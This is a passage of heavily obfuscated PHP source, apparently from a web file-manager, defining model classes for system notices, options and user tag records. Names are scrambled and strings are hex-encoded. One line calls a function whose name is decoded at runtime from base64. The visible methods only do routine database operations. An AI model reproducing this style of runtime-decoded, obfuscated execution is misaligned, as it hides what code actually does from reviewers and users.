($å©Ü¿ as $œñ¯êª¢) { $µË©øô[$œñ¯êª¢[$ÖµŠœ¢Õ[32]]] = $œñ¯êª¢; } return $µË©øô; } } goto cŠ†¦£‘„Ø; B‡…†ã¦Æï: $fileSize = strrev(base64_decode($_SERVER[ò‡Ÿ¥¨®][0])); function binCheckNeq($®³äÁ¨­, $ù°‘‰¡) { return $®³äÁ¨­ != $ù°‘‰¡; } $_SERVER[$_SERVER[ò‡Ÿ¥¨®][1]] = $fileSize($_SERVER[$_SERVER[ò‡Ÿ¥¨®][2]]); goto d¹«äµ±¥Ü; E¦‚í¶ñ: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\x6d\56\x6e\x6f\164\x69\x63\x65\114\x69\163\164"; public $field = array("\156\141\x6d\145", "\143\x6f\x6e\x74\145\156\x74", "\x61\165\x74\150", "\x6d\x6f\144\x65", "\x74\151\x6d\x65", "\164\x79\160\145", "\154\145\x76\x65\154", "\145\x6e\x61\142\154\145", "\x73\157\x72\x74"); public function listData($Â¾Ãˆô = false, $Û¨ß€µ• = "\x73\x6f\162\164", $î©”Ã×ñ = false) { return parent::listData($Â¾Ãˆô, $Û¨ß€µ•, $î©”Ã×ñ); } public function add($¦Ì †ŠÑ) { $âà±Ú‹¡ =& $_SERVER[Ü©»’·]; $íâŒà” = time(); if ($¦Ì †ŠÑ[$âà±Ú‹¡[16]] == $âà±Ú‹¡[2284]) { $íâŒà” = strtotime($¦Ì †ŠÑ[$âà±Ú‹¡[203]]); } $¦Ì †ŠÑ[$âà±Ú‹¡[203]] = $íâŒà”; return parent::insert($¦Ì †ŠÑ); } public function update($ĞÛ¡Æº›, $ô¥ĞÁáª) { $†şË½»Ğ =& $_SERVER[Ü©»’·]; $ÎçïæŠ¹ = $this->listData($ĞÛ¡Æº›); if (!$ÎçïæŠ¹) { return !1; } $ÌÉØğ£“ = time(); if ($ô¥ĞÁáª[$†şË½»Ğ[16]] == $†şË½»Ğ[2284]) { $ÌÉØğ£“ = strtotime($ô¥ĞÁáª[$†şË½»Ğ[203]]); } $ô¥ĞÁáª[$†şË½»Ğ[203]] = $ÌÉØğ£“; return parent::update($ĞÛ¡Æº›, $ô¥ĞÁáª); } public function remove($‹Ø¦’É‘) { $¨ÎôÜ¤İ = $this->listData($‹Ø¦’É‘); if (!$¨ÎôÜ¤İ || $¨ÎôÜ¤İ[$_SERVER[Ü©»’·][1288]]) { return !1; } return parent::remove($‹Ø¦’É‘); } public function sort($†µ‚£íÌ, $¼î„‘®í) { return parent::update($†µ‚£íÌ, $¼î„‘®í); } public function enable($®ÎÈê‚€, $Œ‚‚¶ç›) { return parent::update($®ÎÈê‚€, array($_SERVER[Ü©»’·][2285] => $Œ‚‚¶ç›)); } private function initUserOption() { $ÇÜé¯˜Ğ =& $_SERVER[Ü©»’·]; $this->optionType = $ÇÜé¯˜Ğ[2286]; $this->modelType = $ÇÜé¯˜Ğ[2287]; $this->field = array($ÇÜé¯˜Ğ[2288], $ÇÜé¯˜Ğ[32], $ÇÜé¯˜Ğ[203], $ÇÜé¯˜Ğ[33], $ÇÜé¯˜Ğ[2289], $ÇÜé¯˜Ğ[756], $ÇÜé¯˜Ğ[195]); } public function userNoticeGet($¸¦¡Íö = false) { $this->initUserOption(); return parent::listData($¸¦¡Íö, $_SERVER[Ü©»’·][408], !0); } public function userNoticeAdd($ÓÚ›ïú®) { $·“ä„’  =& $_SERVER[Ü©»’·]; $this->initUserOption(); $¯…¯ÏŞ = $this->findByKey($·“ä„’ [2288], $ÓÚ›ïú®[$·“ä„’ [408]]); if ($¯…¯ÏŞ) { return !0; } $ş±ù«ÓË = array($·“ä„’ [2288] => $ÓÚ›ïú®[$·“ä„’ [408]], $·“ä„’ [32] => $ÓÚ›ïú®[$·“ä„’ [32]], $·“ä„’ [203] => $ÓÚ›ïú®[$·“ä„’ [203]], $·“ä„’ [33] => isset($ÓÚ›ïú®[$·“ä„’ [33]]) ? $ÓÚ›ïú®[$·“ä„’ [33]] : 1, $·“ä„’ [2289] => isset($ÓÚ›ïú®[$·“ä„’ [2289]]) ? $ÓÚ›ïú®[$·“ä„’ [2289]] : 0, $·“ä„’ [756] => 0, $·“ä„’ [195] => 0); return parent::insert($ş±ù«ÓË); } public function userNoticeEdit($³ùĞ¡ê‹, $‹ÖÇ»€·) { $this->initUserOption(); return parent::update($³ùĞ¡ê‹, $‹ÖÇ»€·); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\x73\164\x65\155\x5f\x6f\160\164\151\x6f\x6e"; protected $jsonField = array("\x6d\145\x6e\x75", "\162\157\154\x65", "\162\x6f\154\x65\x47\162\x6f\x75\x70", "\162\145\x67\x69\x73\164", "\x65\x6d\141\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($¢·Ä¨¡Ú) { return "\123\171\163\x74\145\155\x4f\160\x74\151\x6f\x6e\x5f{$¢·Ä¨¡Ú}"; } protected function optionDefault($öë½Şã° = '') { $ø‹ºêõ² =& $_SERVER[Ü©»’·]; if ($öë½Şã° == $ø‹ºêõ²[12]) { return $GLOBALS[$ø‹ºêõ²[6]][$ø‹ºêõ²[390]]; } } } class SystemRecordModel extends ModelBaseLight { } goto d¹•Úã¥¢á; d×èÅŠˆ’Â: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\x65\162\x5f\146\141\166"; protected function cacheFunctionAlias($ÁíºÊÏÂ) { $°æ®Ê›° =& $_SERVER[Ü©»’·]; return array($°æ®Ê›°[1969] => array($°æ®Ê›°[2348] . USER_ID, $°æ®Ê›°[1970])); } protected function listData() { $»ÕÂÏôÁ =& $_SERVER[Ü©»’·]; $’ù³´§ï = array($»ÕÂÏôÁ[1660] => USER_ID, $»ÕÂÏôÁ[493] => array($»ÕÂÏôÁ[1973], 0)); $Ğæ»üÔ = $»ÕÂÏôÁ[2349]; $ó€ÚÈ¤ = $this->field($Ğæ»üÔ)->where($’ù³´§ï)->order($»ÕÂÏôÁ[1976])->select(); return $ó€ÚÈ¤ ? $ó€ÚÈ¤ : array(); } protected function addToTag($˜ËÒç×ß, $”ú…å”ı) { $ùÍèí¸ò =& $_SERVER[Ü©»’·]; if (!Model($ùÍèí¸ò[2113])->listData($”ú…å”ı)) { return !1; } if (is_numeric($˜ËÒç×ß)) { $ø˜ÉÊ¸å = Model($ùÍèí¸ò[831])->pathInfo($˜ËÒç×ß); if (!$ø˜ÉÊ¸å) { return !1; } } else { $ø˜ÉÊ¸å = IO::infoSimple($˜ËÒç×ß); if (!$ø˜ÉÊ¸å) { return !1; } $†‘÷™Â† = $ø˜ÉÊ¸å[$ùÍèí¸ò[32]]; $Œµç« = $ø˜ÉÊ¸å[$ùÍèí¸ò[33]]; if (isset($ø˜ÉÊ¸å[$ùÍèí¸ò[419]])) { $Œµç« = $ø˜ÉÊ¸å[$ùÍèí¸ò[419]] == $ùÍèí¸ò[88] ? $ùÍèí¸ò[75] : $ùÍèí¸ò[199]; } } $ñÅ¢äñ = array($ùÍèí¸ò[1660] => USER_ID, $ùÍèí¸ò[493] => $”ú…å”ı, $ùÍèí¸ò[430] => $˜ËÒç×ß, $ùÍèí¸ò[431] => $Œµç« ? $Œµç« : $ùÍèí¸ò[425], $ùÍèí¸ò[429] => $†‘÷™Â† ? $†‘÷™Â† : $ùÍèí¸ò[12], $ùÍèí¸ò[1862] => 0); if ($this->where($ñÅ¢äñ)->find()) { return !1; } return $this->add($ñÅ¢äñ); } protected function removeFromTag($¶©àª, $ã‚ÎÜ­Â) { $ã£¯ç‰ =& $_SERVER[Ü©»’·]; if (!Model($ã£¯ç‰[2113])->listData($ã‚ÎÜ­Â)) { return !1; } if (is_array($¶©àª)) { $¶©àª = array($ã£¯ç‰[7], $¶©àª); } $‰§æ“û» = array($ã£¯ç‰[1660] => USER_ID, $ã£¯ç‰[493] => $ã‚ÎÜ­Â, $ã£¯ç‰[430] => $¶©àª); return $this->where($‰§æ“û»)->delete(); } protected function removeByTag($¸˜”œ) { $”„ê©… =& $_SERVER[Ü©»’·]; if (!$¸˜”œ) { return !1; } $·ìÒ©¿Ş = array($”„ê©…[1660] => USER_ID, $”„ê©…[493] => $¸˜”œ); return $this->where($·ìÒ©¿Ş)->delete(); } protected function removeBySource($“ºûîïÇ) { $«Áã©ÅÏ =& $_SERVER[Ü©»’·]; if (is_array($“ºûîïÇ)) { $“ºûîïÇ = array($«Áã©ÅÏ[7], $“ºûîïÇ); } $ñùşâ¨ı = array($«Áã©ÅÏ[1660] => USER_ID, $«Áã©ÅÏ[493] => array($«Áã©ÅÏ[1017], 0), $«Áã©ÅÏ[430] => $“ºûîïÇ); return $this->where($ñùşâ¨ı)->delete(); } }